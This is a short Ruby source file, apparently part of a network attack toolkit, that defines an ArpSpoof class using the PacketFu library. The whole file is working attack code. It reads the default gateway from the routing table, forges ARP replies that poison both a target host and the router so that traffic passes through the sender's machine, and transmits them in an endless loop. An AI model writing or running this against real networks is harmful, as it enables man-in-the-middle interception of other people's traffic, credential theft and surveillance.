require 'rubygems'
require 'packetfu'

class ArpSpoof
    def initialize(config, targetMac, addr, iface)
        @config = config
        @targetAddr = addr
        @targetMac = targetMac
        @iface = iface
        @gateway = `ip route show`.match(/default.*/)[0].match(/\d\d?\d?\.\d\d?\d?\.\d\d?\d?\.\d\d?\d?/)[0]
        @running = true
    end

    def start

        arp_packet_target = PacketFu::ARPPacket.new()
        arp_packet_target.eth_saddr = @config[:eth_saddr]       # sender's MAC address
        arp_packet_target.eth_daddr = @targetMac                # target's MAC address
        arp_packet_target.arp_saddr_mac = @config[:eth_saddr]   # sender's MAC address
        arp_packet_target.arp_daddr_mac = @targetMac            # target's MAC address
        arp_packet_target.arp_saddr_ip = @gateway               # router's IP
        arp_packet_target.arp_daddr_ip = @targetAddr           # target's IP
        arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply

        # Construct the router's packet
        arp_packet_router = PacketFu::ARPPacket.new()
        arp_packet_router.eth_saddr = @config[:eth_saddr]       # sender's MAC address
        arp_packet_router.eth_daddr = @config[:eth_daddr]       # router's MAC address
        arp_packet_router.arp_saddr_mac = @config[:eth_saddr]   # sender's MAC address
        arp_packet_router.arp_daddr_mac = @config[:eth_daddr]   # router's MAC address
        arp_packet_router.arp_saddr_ip = @targetAddr            # target's IP
        arp_packet_router.arp_daddr_ip = @gateway               # router's IP
        arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply

        while (@running)
            arp_packet_target.to_w(@iface)
            arp_packet_router.to_w(@iface)
        end
    end

    def stop
        @running = false
    end
end
